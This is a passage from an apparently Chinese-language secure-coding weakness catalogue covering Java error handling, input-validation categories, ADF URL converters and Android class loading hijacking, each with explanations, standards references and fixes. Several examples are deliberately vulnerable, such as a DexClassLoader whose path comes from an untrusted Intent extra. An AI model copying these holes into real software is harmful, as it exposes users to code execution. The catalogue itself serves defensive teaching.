class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch (SQLException se)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        //handle error</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    finally</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if (fis == null)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            throw new FileNotFoundException();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        if (stmt != null)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                stmt.close();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            catch (SQLException e)</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                log(e);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-249"><a href="#RECOMMENDATIONS-249" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿从 finally 块中抛出异常。如果您必须重新抛出异常，请在 catch 块中执行该操作，这样不会影响到 finally 块的正常执行。<br>例 2：下列代码会在 catch 块中重新抛出 FileNotFoundException。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">public void processTransaction(Connection conn) throws FileNotFoundException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    FileInputStream fis = null;</span><br><span class="line"></span><br><span class="line">    Statement stmt = null;</span><br><span class="line"></span><br><span class="line">    try</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">        fis = new FileInputStream(&quot;badFile.txt&quot;);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch (FileNotFoundException fe)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        log(&quot;File not found.&quot;);</span><br><span class="line"></span><br><span class="line">        throw fe;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch (SQLException se)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        //handle error</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    finally</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if (fis != null)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                fis.close();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            catch (IOException ie)</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                log(ie);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        if (stmt != null)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                stmt.close();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            catch (SQLException e)</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                log(e);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-248"><a href="#REFERENCES-248" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Sun Tutorial</p>
<p>[2] ERR05-J. Do not let checked exceptions escape from a finally block CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[4] Standards Mapping - FIPS200 AU</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Unhandled-SSL-Exception"><a href="#Poor-Error-Handling-Unhandled-SSL-Exception" class="headerlink" title="Poor Error Handling: Unhandled SSL Exception"></a>Poor Error Handling: Unhandled SSL Exception</h4><h5 id="ABSTRACT-250"><a href="#ABSTRACT-250" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>没有显式地处理 SSL 异常可能会导致应用程序无法发现意外状况和情况。</p>
<h5 id="EXPLANATION-251"><a href="#EXPLANATION-251" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>未处理的 SSL 异常会在以下情况中发生：</p>
<ol>
<li><p>抛出特定的 SSL 异常。</p>
</li>
<li><p>未显式地处理异常。</p>
</li>
</ol>
<p>特定 SSL 异常 javax.net.ssl.SSLHandshakeException、javax.net.ssl.SSLKeyException 和 javax.net.ssl.SSLPeerUnverifiedException 都可以传达与 SSL 连接相关的重要错误。如果没有显式地处理这些错误，连接会被处于一种意想不到的、潜在不安全的状态。</p>
<p>几乎每一个对软件系统的严重攻击都是从违反程序员的假设开始的。攻击后，程序员的假设看起来既脆弱又拙劣，但攻击前，许多程序员会在午休时间为自己的种种假设做很好的辩护。</p>
<p>代码中两个容易识破的可疑假设是：“该操作从不会失败”和“如果该操作失败了也没关系”。如果程序员没有抓住某个操作抛出的异常，则间接地表明了他们是基于这些假设进行的操作。</p>
<h5 id="RECOMMENDATIONS-250"><a href="#RECOMMENDATIONS-250" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果某个操作可以抛出异常或提供运行成功或失败的其他证据，应务必检查错误条件，即便没有明显的发生方式。除了防止安全错误之外，许多最初难以解决的 bug 最终都会回到未处理的错误状况中。</p>
<p>在您的应用程序中创建一种便于使用的、标准的处理故障方法。如果错误处理过程简单直接，往往不容易被程序员忽略。一种标准化的错误处理方法是，将围绕检查和处理错误状况的常用函数写入封装器，而无需程序员的其他干预。实施并采用封装器后，就可以禁止使用未封装的函数，并利用自定义规则加以执行。</p>
<h5 id="REFERENCES-249"><a href="#REFERENCES-249" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 388</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h3 id="输入验证与展示问题"><a href="#输入验证与展示问题" class="headerlink" title="输入验证与展示问题"></a>输入验证与展示问题</h3><p>输入验证和表示问题是由于元字符、备选编码和数值表示而引起的。安全问题是由于信任输入而引起的。这些问题包括：“缓冲区溢出”、“跨站点脚本”攻击、“SQL 注入”和许多其他问题。</p>
<p>ADF Bad Practices: Missing URL Parameter Converter</p>
<p>Access Specifier Manipulation</p>
<p>Android Class Loading Hijacking</p>
<p>Bean Manipulation</p>
<p>Command Injection</p>
<p>Content Provider URI Injection</p>
<p>Cross-Site Scripting: DOM</p>
<p>Cross-Site Scripting: External Links</p>
<p>Cross-Site Scripting: Inter-Component Communication</p>
<p>Cross-Site Scripting: Persistent</p>
<p>Cross-Site Scripting: Poor Validation</p>
<p>Cross-Site Scripting: Reflected</p>
<p>Dangerous File Inclusion</p>
<p>Denial of Service</p>
<p>Denial of Service: Format String</p>
<p>Denial of Service: Parse Double</p>
<p>Denial of Service: Regular Expression</p>
<p>Denial of Service: StringBuilder</p>
<p>Deserialization Bad Practice: Blacklist</p>
<p>Dynamic Code Evaluation: Code Injection</p>
<p>Dynamic Code Evaluation: Code Manipulation</p>
<p>Dynamic Code Evaluation: JNDI Reference Injection</p>
<p>Dynamic Code Evaluation: Script Injection</p>
<p>Dynamic Code Evaluation: Unsafe Deserialization</p>
<p>Dynamic Code Evaluation: Unsafe JSON Deserialization</p>
<p>Dynamic Code Evaluation: Unsafe XStream Deserialization</p>
<p>Dynamic Code Evaluation: XMLDecoder Injection</p>
<p>Expression Language Injection: Spring</p>
<p>File Permission Manipulation</p>
<p>Formula Injection</p>
<p>HTTP Parameter Pollution</p>
<p>Hadoop Cluster Manipulation</p>
<p>Hadoop Job Manipulation</p>
<p>Header Manipulation</p>
<p>Header Manipulation: Cookies</p>
<p>Header Manipulation: SMTP</p>
<p>Insecure Sanitizer Policy</p>
<p>Intent Manipulation</p>
<p>JSON Injection</p>
<p>LDAP Entry Poisoning</p>
<p>LDAP Injection</p>
<p>LDAP Manipulation</p>
<p>Log Forging</p>
<p>Log Forging (debug)</p>
<p>Mail Command Injection: IMAP</p>
<p>Mail Command Injection: POP3</p>
<p>Mail Command Injection: SMTP</p>
<p>Missing XML Validation</p>
<p>Missing XML Validation: Untyped Response</p>
<p>OGNL Expression Injection</p>
<p>OGNL Expression Injection: Double Evaluation</p>
<p>OGNL Expression Injection: Dynamic Method Invocation</p>
<p>OGNL Expression Injection: Struts 2</p>
<p>Open Redirect</p>
<p>Path Manipulation</p>
<p>Path Manipulation: Zip Entry Overwrite</p>
<p>Process Control</p>
<p>Process Control: Invoker Servlet</p>
<p>Query String Injection: Amazon Web Services</p>
<p>Query String Injection: Android Provider</p>
<p>Reflected File Download</p>
<p>Resource Injection</p>
<p>SQL Injection</p>
<p>SQL Injection: Hibernate</p>
<p>SQL Injection: JDO</p>
<p>SQL Injection: MyBatis Mapper</p>
<p>SQL Injection: Persistence</p>
<p>SQL Injection: iBatis Data Map</p>
<p>Server-Side Request Forgery</p>
<p>Server-Side Template Injection</p>
<p>Session Puzzling: Spring</p>
<p>Setting Manipulation</p>
<p>Spring Beans Injection</p>
<p>Struts 2: Action Field Without Validator</p>
<p>Struts 2: Duplicate Action Field Validators</p>
<p>Struts 2: Duplicate Validation Files</p>
<p>Struts 2: Duplicate Validators</p>
<p>Struts 2: Undeclared Validator</p>
<p>Struts 2: Unvalidated Action</p>
<p>Struts 2: Validation File Without Action</p>
<p>Struts 2: Validator Without Action Field</p>
<p>Struts: Duplicate Validation Forms</p>
<p>Struts: Erroneous validate() Method</p>
<p>Struts: Form Does Not Extend Validation Class</p>
<p>Struts: Form Field Without Validator</p>
<p>Struts: Plugin Framework Not In Use</p>
<p>Struts: Unused Action Form</p>
<p>Struts: Unused Validation Form</p>
<p>Struts: Unvalidated Action Form</p>
<p>Struts: Validator Turned Off</p>
<p>Struts: Validator Without Form Field</p>
<p>System Information Leak: Struts 2</p>
<p>Unsafe JNI</p>
<p>Unsafe JSNI</p>
<p>Unsafe Reflection</p>
<p>XML Entity Expansion Injection</p>
<p>XML External Entity Injection</p>
<p>XML Injection</p>
<p>XPath Injection</p>
<p>XQuery Injection</p>
<p>XSLT Injection</p>
<h4 id="ADF-Bad-Practices-Missing-URL-Parameter-Converter"><a href="#ADF-Bad-Practices-Missing-URL-Parameter-Converter" class="headerlink" title="ADF Bad Practices: Missing URL Parameter Converter"></a>ADF Bad Practices: Missing URL Parameter Converter</h4><h5 id="ABSTRACT-251"><a href="#ABSTRACT-251" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Oracle ADF Faces 可标记视图缺少 URL 参数转换器。</p>
<h5 id="EXPLANATION-252"><a href="#EXPLANATION-252" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在常规 JSF 应用程序中，使用 UI 组件指定的转换器和验证器对值进行转换和验证。转换和验证会在提交页面时执行。Fusion 应用程序中的可标记视图会导致不提交页面，因此默认情况下不会执行相应的转换或验证。</p>
<p>例 1：以下配置文件片段显示了配置为不执行 paramName URL 参数转换或验证的可标记视图示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;bookmark&gt;</span><br><span class="line"></span><br><span class="line">        &lt;method&gt;#&#123;paramHandler.handleParams&#125;&lt;/method&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-parameter&gt;</span><br><span class="line"></span><br><span class="line">            &lt;name&gt;paramName&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">            &lt;value&gt;#&#123;requestScope.paramName&#125;&lt;/value&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/url-parameter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/bookmark&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-251"><a href="#RECOMMENDATIONS-251" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为确保在可标记视图上执行适当的 URL 参数转换和验证，必须为每个 URL 参数配置指定的转换器。</p>
<p>例 2：以下片段显示了通过重写从上文中摘录的配置，为 paramName URL 参数配置相应的转换器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;bookmark&gt;</span><br><span class="line"></span><br><span class="line">        &lt;method&gt;#&#123;paramHandler.handleParams&#125;&lt;/method&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-parameter&gt;</span><br><span class="line"></span><br><span class="line">            &lt;name&gt;paramName&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">            &lt;value&gt;#&#123;requestScope.paramName&#125;&lt;/value&gt;</span><br><span class="line"></span><br><span class="line">            &lt;converter&gt;#&#123;paramConverter&#125;&lt;/converter&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/url-parameter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/bookmark&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-250"><a href="#REFERENCES-250" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oracle(R) Fusion Middleware Fusion Developer’s Guide for Oracle Application Development Framework, 15.2.3.Bookmarking View Activities</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Access-Specifier-Manipulation"><a href="#Access-Specifier-Manipulation" class="headerlink" title="Access Specifier Manipulation"></a>Access Specifier Manipulation</h4><h5 id="ABSTRACT-252"><a href="#ABSTRACT-252" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>方法调用可更改访问说明符。</p>
<h5 id="EXPLANATION-253"><a href="#EXPLANATION-253" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>AccessibleObject API 允许程序员绕过由 Java 访问说明符提供的 access control 检查。特别是它让程序员能够允许反映对象绕过 Java access control，并反过来更改私有字段或调用私有方法、行为，这些通常情况下都是不允许的。</p>
<h5 id="RECOMMENDATIONS-252"><a href="#RECOMMENDATIONS-252" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>只能使用攻击者无法设置的参数，通过有权限的类更改访问说明符。所有出现的访问说明符都应仔细检查。</p>
<h5 id="REFERENCES-251"><a href="#REFERENCES-251" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 284</p>
<p>[3] Standards Mapping - FIPS200 AC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 676</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Android-Class-Loading-Hijacking"><a href="#Android-Class-Loading-Hijacking" class="headerlink" title="Android Class Loading Hijacking"></a>Android Class Loading Hijacking</h4><h5 id="ABSTRACT-253"><a href="#ABSTRACT-253" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从一个不可信赖的数据源或在不可信赖的环境中加载类，可能会导致应用程序以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-254"><a href="#EXPLANATION-254" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 类加载劫持漏洞主要表现为以下两种形式：</p>
<ul>
<li><p>攻击者可以更改程序在其中搜索来加载类的目录的名称，从而指向他们有控制权的某个目录的路径：攻击者明确控制了将在其中搜索类的路径。</p>
</li>
<li><p>攻击者可以更改用于加载类的环境：攻击者间接控制了路径名的含义。</p>
</li>
</ul>
<p>在这种情况下，我们着重关注第一种情况，即攻击者也许能够控制在其中搜索加载类的目录的可能性。在以下情况下会发生这种 Android 类加载劫持漏洞：</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据用作一个或部分字符串，代表在其中搜索要加载的类的库目录。</p>
</li>
<li><p>通过从库路径执行代码，应用程序授予攻击者在一般情况下无法获得的权限或能力。</p>
</li>
</ol>
<p>例 1：以下代码使用用户可更改的 userClassPath，来确定在其中搜索要加载的类的目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  productCategory = this.getIntent().getExtras().getString(&quot;userClassPath&quot;);</span><br><span class="line"></span><br><span class="line">  DexClassLoader dexClassLoader = new DexClassLoader(productCategory, optimizedDexOutputPath.getAbsolutePath(), null, getClassLoader());</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>此代码允许攻击者通过将 userClassPath 的结果修改为指向他们控制的不同路径，以提升的应用程序权限加载库并可能执行任意代码。因为程序不验证从环境读取的值，如果攻击者能够控制 userClassPath 的值，那么他们就可以欺骗应用程序指向他们控制的目录，从而使用与原始应用程序一样的权限加载他们已经定义的类。</p>
<p>例 2：以下代码使用用户可更改的 userOutput，来确定应将优化的 DEX 文件写入的目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  productCategory = this.getIntent().getExtras().getString(&quot;userOutput&quot;);</span><br><span class="line"></span><br><span class="line">  DexClassLoader dexClassLoader = new DexClassLoader(sanitizedPath, productCategory, null, getClassLoader());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
